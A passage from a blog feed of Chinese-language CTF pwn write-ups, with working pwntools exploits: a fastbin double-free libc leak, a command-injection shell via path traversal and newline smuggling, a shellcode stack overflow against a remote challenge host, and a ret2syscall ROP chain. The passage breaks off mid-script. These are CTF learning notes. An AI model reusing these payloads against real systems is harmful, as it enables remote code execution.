class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;The length of your content ---&gt;&#x27;</span>, str(size))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Content ---&gt;&#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\">def edit(index, size,content):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index ---&gt;&#x27;</span>, str(index))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;The length of your content ---&gt;&#x27;</span>, str(size))</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Content ---&gt;&#x27;</span>, content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def show(index):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index ---&gt;&#x27;</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def delete(index):</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;5. exit&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">&#x27;Index ---&gt;&#x27;</span>, str(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;xielu&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">&quot;dizhi&quot;</span>) # <span class=\"number\">3</span> 泄露地址用</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&quot;hebing&quot;</span>) # 防止合并</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Content: &quot;</span>)</span><br><span class=\"line\">libc_addr = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,b<span class=\"string\">&quot;\\x00&quot;</span>)) - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">print(hex(libc_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># fastbin double free修改</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,p64(<span class=\"number\">0x602022</span>))</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&quot;a&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">&quot;b&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">#pause()</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,b<span class=\"string\">&quot;\\x40\\x00\\x00\\x00\\x00\\x00&quot;</span>+p64(libc_addr+<span class=\"number\">0x4527a</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"server\"><a href=\"#server\" class=\"headerlink\" title=\"server\"></a>server</h1><p>​\t\t当时做的时候没想到栈的重叠的问题,单纯过滤肯定是没戏的.咋说捏,只会一些传统的套路是不行的,那只是基础,要在此之上更上一个纬度,看清事物的本质,学会变通才能应对更复杂的情况.</p>\n<p>​\t\t对此题的反思就是,首先还是基础,要打好基础,打好操作系统原理的基础,如果懂这个的话,估计其实很容易想到重叠的问题.然后再培养细心以及一些自动化工具帮你寻找类似的点.</p>\n<h2 id=\"思路一\"><a href=\"#思路一\" class=\"headerlink\" title=\"思路一\"></a>思路一</h2><p>​\t\taccess校验的长度有限,为32</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">snprintf</span>(name, <span class=\"number\">0x20</span>uLL, <span class=\"string\">&quot;/keys/%s.key&quot;</span>, s);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">这个长度是<span class=\"number\">27</span>,加上/keys就是<span class=\"number\">32</span>了</span><br><span class=\"line\">../../../../../././bin/sh #</span><br><span class=\"line\">    </span><br><span class=\"line\">/keys/../../../../../././bin/sh 最后access的是这个文件,肯定是存在的</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t</p>\n<p>​\t\t然后就是命令拼接了,<font color=\"red\">存在未初始化漏洞,栈上有残留数据</font></p>\n<p>​\t\t第二次输入个单引号就好了, \\n也可以作为命令分隔符,所以前面那个add_user -u ‘’就是没用的了,直接执行后面的&#x2F;bin&#x2F;sh了</p>\n<p>​\t\t过滤 ; &amp; &#96; | $ 空格 ( ) {} - &#x2F; \\</p>\n<p>​\t\t这个不用写脚本,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一次选<span class=\"number\">1</span>,输入</span><br><span class=\"line\">../../../../../././bin/sh #</span><br><span class=\"line\">然后选<span class=\"number\">2</span>,输入</span><br><span class=\"line\">&#x27;</span><br><span class=\"line\">然后就闭合了,就可以getshell了</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"string\">&quot;add_user -u &#x27;%s&#x27; -p &#x27;888888&#x27;&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">► <span class=\"number\">0x555555555748</span>    call   system@plt                &lt;system@plt&gt;</span><br><span class=\"line\">        command: <span class=\"number\">0x7fffffffe410</span> ◂— <span class=\"string\">&quot;add_user -u &#x27;&#x27;\\n/bin/sh #&#x27; -p &#x27;888888&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"思路二\"><a href=\"#思路二\" class=\"headerlink\" title=\"思路二\"></a>思路二</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;\\ncat\\tfl*\\n</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这里也用到覆盖了,看exp就可以理解了,exp的12就是随便输入的,后面的’\\n会替代</p>\n<p>​\t\t\t\t过滤的空格可以用\\t替代</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = <span class=\"string\">&quot;./pwn_7&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(elf)</span><br><span class=\"line\"><span class=\"comment\">#p =remote(&quot;node4.buuoj.cn&quot;, 25471)</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Please input the key of admin : &quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;../../../../../../../../../&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recv())</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Please input the username to add :&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;xxcat\\tfl*\\n&quot;</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">p.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Your choice &gt;&gt;&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Please input the username to add :&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&quot;&#x27;&quot;</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recv(<span class=\"number\">1024</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(p.recv(<span class=\"number\">1024</span>))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t 能不能’cat\\tfl*\\n呢,不能呀,,需要有个\\n,但是没有,也没有; 没有分隔符没办法执行两条命令,这个必须要\\n的 \\t不行吗,不行…….</p>\n<p><a href=\"https://blog.51cto.com/u_15400016/4287727\">https://blog.51cto.com/u_15400016/4287727</a></p>\n<p><a href=\"https://www.secpulse.com/archives/96374.html\">https://www.secpulse.com/archives/96374.html</a></p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>用recv应该是接收到\\n为止? 所</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/",
            "title": "pwn入门-30-2023OUC校赛",
            "date_published": "2023-06-03T08:18:00.000Z",
            "content_html": "<p>​\t\t拖了挺久才整理…不应该…以后要及时复盘. 本身题不是很难,不过有很多小细节,自己之前没弄懂,还是说有时间的话,多研究研究,以及之前的题,要进行一定的复盘.</p>\n<h2 id=\"恢复符号\"><a href=\"#恢复符号\" class=\"headerlink\" title=\"恢复符号\"></a>恢复符号</h2><p>​\t\t比较恶心的一个点(其实也不恶心,就是自己之前没弄过),找到了一些文章,然后github有编译好的符号文件,可以直接ida导入就好了,回头有时间可以自己编译一下</p>\n<p>​\t\t<a href=\"https://github.com/maroueneboubakri/lscan\">https://github.com/maroueneboubakri/lscan</a></p>\n<p>​\t\t<a href=\"https://blog.csdn.net/Breeze_CAT/article/details/103788796\">https://blog.csdn.net/Breeze_CAT/article/details/103788796</a></p>\n<p>​\t\tida中shift+f5,然后把符号文件添加进去</p>\n<p>​\t\t还有就是一些地址的计算…头大,,(估计还是原理没完全搞明白)</p>\n<h2 id=\"pwn1\"><a href=\"#pwn1\" class=\"headerlink\" title=\"pwn1\"></a><strong>pwn1</strong></h2><p>​\t\t栈长度是0x68 &#x3D; 104,但能读取256,很明显的栈溢出,可以覆盖返回地址,而且没有开NX保护,可以写shellcode,于是问题就变成了怎么跳到shellcode呢,或者怎么知道shellcode的地址,puts的话,遇到\\x00才会停止所以可以前面填满,然后输出ebp这里的值,这里的值好像会有一些变化,所以可以不用太具体,前面一直加nop就好了,跳到nop然后走,然后shellcode</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">0074</span>│     <span class=\"number\">0xffffd4f4</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">0078</span>│ ebp <span class=\"number\">0xffffd4f8</span> —▸ <span class=\"number\">0xffffd508</span> ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tebp和esp差了0x90 esp和ecx(开始输出字符串那里)差了0x28,ebp输出的值和ebp差了0xbe,这样有点乱,画图会清晰很多</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603191839695.png\" alt=\"image-20230603191839695\" style=\"zoom: 33%;\">\n\n<p>​\t\t这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究,可以简单的跳到这个位置就好了,加一些nop(但是打远程的时候不知道为什么老不成功,可以加一点偏移,因为毕竟是往前跳)</p>\n<p>​\t\t有system有&#x2F;bin&#x2F;sh 能不能rop呢?</p>\n<p>p32(addr-0xbe+0x2e+0x28)</p>\n<p>​\t\t</p>\n<p>​\t\t换句话说,ebp这个位置的值如果正好位于 [ebp-0x68,ebp-len(shellcode)]之间的话,就正好到了nop,如果大的话,就需要我们来加一点值了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;101.43.247.245&quot;</span>,<span class=\"number\">9200</span>)</span><br><span class=\"line\"><span class=\"comment\">#systemaddr = 0x8048440</span></span><br><span class=\"line\"><span class=\"comment\">#binsh = 0x80486C0</span></span><br><span class=\"line\"><span class=\"comment\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x80488F2&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;say&quot;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x68</span>)</span><br><span class=\"line\"><span class=\"comment\">#addr = u32(sh.recv(8)[4:8])</span></span><br><span class=\"line\">sh.recv(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">addr = u32(sh.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">nop = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        nop</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">shellcode = nop*<span class=\"number\">30</span>+shellcode</span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">0x68</span>, <span class=\"string\">b&#x27;b&#x27;</span>) + p32(<span class=\"number\">0</span>)+p32(addr+<span class=\"number\">0xbe</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr+<span class=\"number\">0xbe</span>-<span class=\"number\">0x90</span>+<span class=\"number\">0x28</span>+<span class=\"number\">4</span>))</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./pwn01&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;101.43.247.245&quot;,9200)</span></span><br><span class=\"line\"><span class=\"comment\">#systemaddr = 0x8048440</span></span><br><span class=\"line\"><span class=\"comment\">#binsh = 0x80486C0</span></span><br><span class=\"line\"><span class=\"comment\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x80488F2&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;say&quot;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x68</span>)</span><br><span class=\"line\"><span class=\"comment\">#addr = u32(sh.recv(8)[4:8])</span></span><br><span class=\"line\">sh.recv(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">addr = u32(sh.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">nop = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        nop</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">shellcode = nop*<span class=\"number\">40</span>+shellcode</span><br><span class=\"line\">payload = shellcode.ljust(<span class=\"number\">0x68</span>,<span class=\"string\">b&#x27;b&#x27;</span>) + p32(<span class=\"number\">0</span>)+p32(addr+<span class=\"number\">0x2e</span>+<span class=\"number\">0x28</span>-<span class=\"number\">4</span>)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603182001856.png\" alt=\"image-20230603182001856\"></p>\n<p>还遇到很玄学的问题,nop加多了,怎么也不行,</p>\n<p>感觉像是后面的指令并没有识别出来      不多,好像是没传送完全?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230603182755733.png\" alt=\"image-20230603182755733\"></p>\n<h2 id=\"pwn2\"><a href=\"#pwn2\" class=\"headerlink\" title=\"pwn2\"></a><strong>pwn2</strong></h2><p>​\t\t加了nx保护,用rop吧,ret2syscall, 这下不用算哪个比较恶心的shellcode的位置了,用ret2syscall是因为没有找到system函数..</p>\n<p>​\t\texecve(“&#x2F;bin&#x2F;sh”,NULL,NULL)</p>\n<p>​\t\t其中，该程序是 32 位，所以我们需要使得</p>\n<ul>\n<li><p>系统调用号，即 eax 应该为 0xb</p>\n</li>\n<li><p>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</p>\n</li>\n<li><p>第二个参数，即 ecx 应该为 0</p>\n</li>\n<li><p>第三个参数，即 edx 应该为 0</p>\n<p>没有 &#x2F;bin&#x2F;sh,那就写入到栈后面,反正需要栈的地址,计算一下就可以了</p>\n</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x080b8eb6 : pop eax ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x080481c9 : pop ebx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x080df8bd : pop ecx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x0806f83b : pop edx ; ret</span><br><span class=\"line\"></span><br><span class=\"line\">0x0806d443 : int 0x80</span><br><span class=\"line\"></span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08048798 : leave ; ret</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t写一下payload</p>\n<p>​\t\t栈是104+4(ebp) &#x3D; 108, 溢出了 256-108 &#x3D; 148字节</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">binsh =  addr + <span class=\"number\">10</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload= b<span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">0x68</span> + b<span class=\"string\">&quot;b&quot;</span>*<span class=\"number\">4</span> + p32(pop_eax)+p32(<span class=\"number\">0xb</span>)+p32(pop_ebx)+p32(binsh)+p32(pop_ecx)+p32(<span class=\"number\">0</span>)+p32(pop_edx)+p32(<span class=\"number\">0</span>) + p32(int80)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"泄露栈地址\"><a href=\"#泄露栈地址\" class=\"headerlink\" title=\"泄露栈地址\"></a>泄露栈地址</h3><p>​\t\tputs函数遇到\\n才会停止,所以可以以此来泄露栈上残留的值来泄露地址,其实不一定要泄露这个,哪个都行, <font color=\"red\">不过有一个问题就是,这个值会是固定的嘛… </font></p>\n<p>​\t\t不是固定的….可以换一个泄露,但是如果覆盖了ebp的话,是不是会影响栈桢呢….</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-30-2023OUC%E6%A0%A1%E8%B5%9B/image-20230605205630458.png\" alt=\"image-20230605205630458\"></p>\n<p>​\t\t溢出长度是不够的,需要栈迁移</p>\n<p>​\t\t当时好像想的是先把&#x2F;bin&#x2F;sh写到一个地方…</p>\n<p>这是做的时候写的exp,是有概率拿到shell的…</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = process(&#x27;./pwn1&#x27;)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;101.43.247.245&quot;</span>,<span class=\"number\">9201</span>)</span><br><span class=\"line\"><span class=\"comment\">#systemaddr = 0x8048440</span></span><br><span class=\"line\"><span class=\"comment\">#binsh = 0x80486C0</span></span><br><span class=\"line\"><span class=\"comment\">#sh.sendline(b&#x27;A&#x27; * (0x68+4) + p32(systemaddr)+p32(0)+p32(binsh))</span></span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x80488F2&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 泄露栈地址</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;say&quot;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x68</span>)</span><br><span class=\"line\"><span class=\"comment\">#addr = u32(sh.recv(8)[4:8])</span></span><br><span class=\"line\">sh.recv(<span class=\"number\">0x68</span>)</span><br><span class=\"line\">addr = u32(sh.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x080b8eb6</span></span><br><span class=\"line\">pop_ebx = <span class=\"number\">0x080481c9</span></span><br><span class=\"line\">pop_ecx = <span class=\"number\">0x080df8bd</span></span><br><span class=\"line\">pop_edx = <span class=\"number\">0x0806f83b</span></span><br><span class=\"line\">int80 = <span class=\"number\">0x0806d443</span></span><br><span class=\"line\">leaveret = <span class=\"number\">0x08048798</span></span><br><span class=\"line\">binsh =  addr + <span class=\"number\">0xae</span>-<span class=\"number\">0x78</span>+<span class=\"number\">0x10</span>-<span class=\"number\">4</span> + <span class=\"number\">11</span>*<span class=\"number\">4</span>-<span class=\"number\">4</span></span><br><span class=\"line\">payload= p32(pop_eax)+p32(<span 